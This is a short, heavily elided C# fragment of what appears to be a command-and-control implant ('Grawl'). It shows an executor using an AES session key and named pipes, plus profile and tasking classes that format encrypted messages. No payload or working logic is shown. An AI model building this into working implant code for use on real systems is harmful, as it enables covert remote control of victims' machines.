...
namespace GrawlExecutor
{
    class Grawl
    {
        public static void Execute(string ANOTHERID, Aes SessKEy, NamedPipeServerStream ServerPipe = null, string PipeName = null)
        {
            try
            {
                ...
                (
                    ...
                    bAsemEsSenger,
                    new Profile(ProfileReadFormat, ProfileWriteFormat, ANOTHERID)
                );
    ...
    public class Profile
    {
        ...
        public string FormatReadFormat(GrawlEncMsg Message) { return Format(this.ReadFormat, this.Guid, Message); }
        public string FormatWriteFormat(GrawlEncMsg Message) { return Format(this.WriteFormat, this.Guid, Message); }
    ...
    public class TaskingMessenger
    {
        ...
        public void QueueTaskingMessage(string Message, string Meta = "")
        {
            ...
            string uploaded = this.Profile.FormatWriteFormat(grawlMessage);
